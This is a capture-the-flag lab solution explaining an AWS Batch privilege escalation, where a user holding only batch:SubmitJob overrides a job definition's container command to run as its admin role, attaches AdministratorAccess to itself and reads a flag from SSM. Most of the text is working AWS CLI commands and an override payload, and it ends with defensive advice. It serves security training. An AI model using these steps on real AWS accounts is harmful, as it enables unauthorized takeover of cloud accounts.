# Solution: AWS Batch SubmitJob to Admin via Existing Admin Job Definition

Most AWS privilege escalation paths involving Batch are caught by CSPM tools looking for `iam:PassRole` combined with `batch:RegisterJobDefinition`. The mental model is straightforward: if you can pass a powerful role to a new job definition and then submit that definition, you can run code as that role. Block `iam:PassRole`, block the path.

This scenario demonstrates why that mental model is incomplete. The `batch:SubmitJob` API accepts a `ContainerOverrides` parameter that lets the caller replace the container's command, environment variables, and resource requirements at submit time — without touching the job definition. Crucially, the `jobRoleArn` is part of the job definition, not the submit call. Once a job definition exists with a privileged role bound to it, anyone with `batch:SubmitJob` can inject an arbitrary command that runs as that role, no `iam:PassRole` required.

This is a classic "existing passrole" pattern: a powerful IAM role was legitimately passed to a job definition at some point in the past, and now any principal that can submit to that definition can exploit it. In real environments this shows up when teams create Batch jobs for data processing or ETL work, attach admin roles "for convenience," and then grant `batch:SubmitJob` broadly to engineers who need to kick off jobs. The job definition accumulates permissions far beyond what any individual submitter was intended to have.

## The Challenge

You have obtained credentials for `pl-prod-batch-002-to-admin-starting-user` — a low-privilege IAM user with a single permission: `batch:SubmitJob`. There is no `iam:PassRole`, no `batch:RegisterJobDefinition`, no `iam:CreateAccessKey`. On paper this looks harmless.

Somewhere in the account is a Batch job definition — `pl-prod-batch-002-to-admin-job-def` — that was registered with `pl-prod-batch-002-to-admin-admin-role` as its `jobRoleArn`. That role has `AdministratorAccess`. Your goal is to leverage `batch:SubmitJob` to execute arbitrary code as that admin role, use it to attach `AdministratorAccess` to your starting user, and then retrieve the CTF flag from SSM Parameter Store.

Start by confirming your identity and the current state of your permissions:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-batch-002-to-admin-starting-user`. Confirm you have no admin access yet:

```bash
aws ssm get-parameter --name /pathfinding-labs/flags/batch-002-to-admin
# AccessDenied
```

Good. No flag access yet.

## Reconnaissance

With the helpful permissions available — `batch:DescribeJobDefinitions`, `batch:DescribeJobQueues`, `batch:DescribeJobs`, `batch:DescribeComputeEnvironments` — you can map the Batch environment before striking.

First, enumerate active job definitions and look at their `jobRoleArn` values:

```bash
aws batch describe-job-definitions \
  --status ACTIVE \
  --query 'jobDefinitions[*].[jobDefinitionName,jobDefinitionArn,containerProperties.jobRoleArn]' \
  --output table
```

You'll spot `pl-prod-batch-002-to-admin-job-def` with `jobRoleArn` pointing to `pl-prod-batch-002-to-admin-admin-role`. That role name is a strong signal — confirm its permissions if you have `iam:GetRole` or `iam:ListAttachedRolePolicies` available; even if you don't, the naming convention tells you everything you need.

Next, find a job queue to submit to:

```bash
aws batch describe-job-queues \
  --query 'jobQueues[*].[jobQueueName,state,status]' \
  --output table
```

You should see `pl-prod-batch-002-to-admin-queue` in the `ENABLED/VALID` state, connected to the Fargate compute environment. Now you have your two targets: the job definition and the queue. Time to exploit.

## Exploitation

The attack is a single `batch:SubmitJob` call with `--container-overrides` replacing the command. Build the override payload first:

```bash
cat > /tmp/overrides.json <<'EOF'
{
  "command": [
    "sh", "-c",
    "pip install --quiet awscli && aws iam attach-user-policy --user-name pl-prod-batch-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
  ],
  "environment": [
    {"name": "AWS_DEFAULT_REGION", "value": "<your-region>"}
  ]
}
EOF
```

This tells Batch to ignore whatever command was baked into the job definition and instead run your shell one-liner. The job definition runs `python:3.11-slim`, a generic data-processing image with no custom `ENTRYPOINT`, so `ContainerOverrides.Command` fully replaces execution — your command runs as arbitrary shell code with the container's (admin) job role credentials. Because `python:3.11-slim` ships neither the `aws` CLI nor `curl`, the payload first `pip install`s the aws CLI, then attaches `AdministratorAccess`.

Now submit the job:

```bash
aws batch submit-job \
  --job-name pl-batch-002-privesc-job \
  --job-definition pl-prod-batch-002-to-admin-job-def \
  --job-queue pl-prod-batch-002-to-admin-queue \
  --container-overrides file:///tmp/overrides.json
```

Note the `jobId` from the response. Fargate takes a minute or two to provision the container, so poll the status:

```bash
aws batch describe-jobs \
  --jobs <job-id> \
  --query 'jobs[0].status' \
  --output text
```

You will see the status progress through `SUBMITTED` → `PENDING` → `RUNNABLE` → `STARTING` → `RUNNING` → `SUCCEEDED`. Once it hits `SUCCEEDED`, the container has run as the admin role and executed your `iam:AttachUserPolicy` call. The admin role's credentials were injected automatically by the ECS container credential provider — you never saw them, never held them, never needed `iam:PassRole` to make this happen.

Wait 30 seconds for IAM policy propagation:

```bash
sleep 30
```

Confirm the policy attached successfully:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-batch-002-to-admin-starting-user \
  --output table
```

You should see `AdministratorAccess` in the results.

## Verification

Still using your original starting-user credentials (the same access key and secret you started with — no new credentials needed), verify admin access:

```bash
aws iam list-users --max-items 3 --output table
```

If that returns a list of users, you have administrator access. The starting user's IAM identity is unchanged, but its effective permissions now include everything in the account.

## Capture the Flag

The flag lives in SSM Parameter Store at `/pathfinding-labs/flags/batch-002-to-admin`. Before the escalation this parameter was inaccessible — `ssm:GetParameter` returned `AccessDenied`. Now, with `AdministratorAccess` attached to the starting user, those same starting-user credentials have `ssm:GetParameter` on every parameter in the account.

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/batch-002-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value returned is the CTF flag. No credential swap, no role assumption — the same access key you started with now has administrator permissions because the Batch container attached the policy to your user on your behalf.

## What Happened

You escalated from a single `batch:SubmitJob` permission to full account administrator in one API call. The key insight is that `ContainerOverrides.Command` lets the submitter replace the job's command without touching the job definition — and the job definition already carried the trust that mattered: the admin `jobRoleArn`. The attacker did not need to pass the role, register a definition, or create any new IAM resources. They simply submitted to a definition that was already misconfigured.

In real environments this pattern is easy to miss. CSPM tools and security reviews typically focus on `iam:PassRole` as the gating control for Batch privilege escalation. But once a job definition with a privileged role exists — even one that was legitimately created for a specific workload — any principal with `batch:SubmitJob` on that definition can abuse it. The misconfiguration is not in the act of submitting the job; it is in the combination of a broadly-scoped `batch:SubmitJob` grant and a job definition whose `jobRoleArn` exceeds what any random submitter should be able to invoke.

The defense is layered: scope `batch:SubmitJob` to specific job definition ARNs, avoid attaching admin-equivalent roles as `jobRoleArn`, and audit all active job definitions for privileged role references — not just when they are created, but continuously.
